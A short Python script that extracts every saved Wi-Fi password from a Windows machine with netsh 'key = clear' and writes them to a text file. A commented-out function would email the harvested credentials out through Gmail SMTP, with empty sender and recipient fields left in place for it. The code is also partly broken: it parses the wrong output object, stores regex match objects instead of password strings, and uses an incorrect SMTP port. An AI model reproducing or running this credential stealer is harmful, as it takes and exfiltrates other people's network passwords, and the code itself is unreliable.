import subprocess
import re
import smtplib


def get_wifi():
    parse_names = subprocess.run('netsh wlan show profile', shell=True, capture_output=True)
    if parse_names.returncode == 0:
        wifi_names = []
        for name in re.findall(':\s\w*', str(parse_names)):
            wifi_names.append(name.replace(':', ' ').strip())

        return wifi_names
    else:
        return False


def keyclear(wifi):
    command = f'netsh wlan show profile {wifi} key = clear'
    run = subprocess.run(command, shell=True, capture_output=True)
    if run.returncode == 0:
        return run
    else:
        return False


def extract_password():
    wif_names = get_wifi()
    pass_dic = {}
    if wif_names:
        for name in wif_names:
            detail = keyclear(name)
            if detail:
                password = re.search('Key\sContent.*', str(detail))
                pass_dic[name] = password

    return pass_dic


def write_file():
    with open('wifi_password.txt', 'w') as f:
        for key, value in extract_password().items():
            content = f'{key} : {value} \n'
            f.write(content)


# def to_string():
#     content = ''' '''
#     for key, value in extract_password().items():
#         content = f'{key} : {value} \n' + content
#
#     return content
#

# def send_email(email , password,to):
#     content = to_string()
#     server = smtplib.SMTP('smtp.gmail.com',578)
#     server.starttls()
#     server.login(email,password)
#     server.sendmail(email ,to , content)
#     server.quit()


if __name__ == '__main__':
    email = ''
    password = ''
    to = ''
    write_file()
